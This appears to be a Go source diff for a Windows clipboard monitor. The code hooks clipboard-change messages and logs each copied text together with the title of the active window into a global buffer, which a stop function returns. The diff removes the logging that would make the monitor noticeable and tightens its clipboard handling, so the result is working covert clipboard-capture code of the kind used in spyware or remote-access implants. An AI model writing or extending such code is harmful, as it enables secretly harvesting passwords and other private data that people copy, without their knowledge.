@@ -15,35 +15,26 @@ import (
 func WindowsProc(hwnd syscall.Handle, msg uint32, wparam, lparam uintptr) uintptr {
 	switch msg {
 	case 0x0002:
-		log.Println("Destroying window")
 		res := winapi.RemoveClipboardFormatListener(uintptr(hwnd))
 		if res == 0 {
-			log.Println("Failed to destroy window")
 			return 0
 		}
 	case 0x001:
-		log.Println("window created")
 		res := winapi.AddClipboardFormatListener(uintptr(hwnd))
 		if res == 0 {
-			log.Println("failed to add listener")
 			return 0
 		}
 	case 0x031D:
-		log.Println("Clipboard updated.")
 		hfgWindow := winapi.GetForegroundWindow()
 		if hfgWindow == 0 {
-			log.Println("failed to get foreground window")
 			return 0
 		}
 		textLength := winapi.GetWindowTextLengthW(uintptr(hfgWindow))
 		if textLength == 0 {
-			log.Println("failed to get text length")
 		}
-		log.Println(textLength)
 		buffer := make([]uint16, textLength+1)
 		read := winapi.GetWindowText(uintptr(hfgWindow), uintptr(unsafe.Pointer(&buffer[0])), int(textLength+1))
 		if !read {
-			log.Println("Unknown Window")
 		}
 		windowTitle := syscall.UTF16ToString(buffer)
 		// read data from clipboard.
@@ -54,11 +45,15 @@ func WindowsProc(hwnd syscall.Handle, msg uint32, wparam, lparam uintptr) uintpt
 			break
 		}
 		hData, _, _ := winapi.PGetClipboardData.Call(uintptr(13))
-		winapi.CloseClipboard()
+
 		if hData == 0 {
-			log.Println("idk")
+			winapi.CloseClipboard()
+			break
 		}
+		winapi.PGlobalLock.Call(hData)
 		clipData := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(hData)))
+		winapi.PGlobalUnlock.Call(hData)
+		winapi.CloseClipboard()
 		GlobalClipData.AppendToString(fmt.Sprintf("Window Title : %s\nClipData: %s\n", windowTitle, clipData))
 	default:
 		ret := winapi.DefWindowProc(hwnd, msg, wparam, lparam)
@@ -144,16 +139,13 @@ func StartClipboardMonitor() {
 			break
 		}
 	}
-	log.Println("clipboard service dead")
 }
 
 func StopClipboardMonitor() (string, error) {
-	log.Println("Sending stop signal")
 	winapi.SendMessage(uintptr(WindowHandle), uintptr(0x0002), uintptr(0), uintptr(0))
 	WindowHandle = 0
 	output := GlobalClipData.GetData()
 	GlobalClipData.ClearData()
-	time.Sleep(time.Second * 5)
-	log.Println("stoooppp")
+	time.Sleep(time.Second * 1)
 	return output, nil
 }
